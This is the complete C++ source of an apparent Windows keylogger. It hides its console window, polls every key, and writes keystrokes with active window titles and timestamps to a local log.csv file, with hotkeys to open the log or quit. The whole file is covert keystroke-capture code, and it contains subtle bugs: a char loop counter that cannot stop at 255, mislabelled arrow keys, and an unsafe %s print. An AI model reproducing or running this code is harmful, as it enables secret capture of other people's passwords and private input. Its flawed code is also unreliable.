#include <iostream>
#include <windows.h>
#include <time.h>

using namespace std;

char prev_Window[256] = "";
char curr_Window[256] = "";

int logger(int key, char *file)
{
    HWND hwnd = GetForegroundWindow();
    char windowTitle[256];
    GetWindowText(hwnd, curr_Window, sizeof(curr_Window));

    if (strcmp(curr_Window, prev_Window) != 0)
    {
        time_t current_time = time(NULL);
        char *dt = ctime(&current_time);
        FILE *OUTPUT_FILE;
        OUTPUT_FILE = fopen(file, "a+");
        fprintf(OUTPUT_FILE, "\n\n%s\t\t%s", curr_Window, dt);
        fclose(OUTPUT_FILE);
        strcpy(prev_Window, curr_Window);
    }
    if (GetAsyncKeyState(VK_CONTROL) & 0x8000 && GetAsyncKeyState(VK_SHIFT) & 0x8000 && GetAsyncKeyState('G') & 0x8000)
    {
        cout << "opening" << endl;
        ShellExecute(0, "open", "log.csv", 0, 0, SW_SHOW);
    }
    if (GetAsyncKeyState(VK_CONTROL) & 0x8000 && GetAsyncKeyState(VK_SHIFT) & 0x8000 && GetAsyncKeyState('Q') & 0x8000)
    {
        exit(0);
    }

    cout << key << endl;
    Sleep(10);
    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");

    if (key == VK_SHIFT)
        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
    else if (key == VK_RETURN)
        fprintf(OUTPUT_FILE, "%s", "[RETURN]");
    else if (key == VK_BACK)
        fprintf(OUTPUT_FILE, "%s", "[BACK SPACE]");
    else if (key == VK_LBUTTON)
        fprintf(OUTPUT_FILE, "%s", "[LButton]");
    else if (key == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
    else if (key == VK_CONTROL)
        fprintf(OUTPUT_FILE, "%s", "[CTRL]");
    else if (key == VK_CAPITAL)
        fprintf(OUTPUT_FILE, "%s", "[CAPS_LOCK]");
    else if (key == VK_MENU)
        fprintf(OUTPUT_FILE, "%s", "[ALT]");
    else if (key == VK_TAB)
        fprintf(OUTPUT_FILE, "%s", "[TAB]");
    else if (key == VK_LEFT)
        fprintf(OUTPUT_FILE, "%s", "[LEFT_ARROW]");
    else if (key == VK_RIGHT)
        fprintf(OUTPUT_FILE, "%s", "[LEFT_RIGHT]");
    else if (key == VK_UP)
        fprintf(OUTPUT_FILE, "%s", "[LEFT_UP]");
    else if (key == VK_DOWN)
        fprintf(OUTPUT_FILE, "%s", "[LEFT_DOWN]");
    else if (key == VK_SPACE)
        fprintf(OUTPUT_FILE, "%s", "[SPACE_KEY]");
    else
        fprintf(OUTPUT_FILE, "%s", &key);
    fclose(OUTPUT_FILE);
    return 0;
}

int main()
{
    FreeConsole();
    char i;
    while (1)
    {
        Sleep(10);
        for (i = 8; i <= 255; i++)
        {
            if (GetAsyncKeyState(i) == -32767)
            {

                logger(i, "log.csv");
            }
        }
    }
    return 0;
}
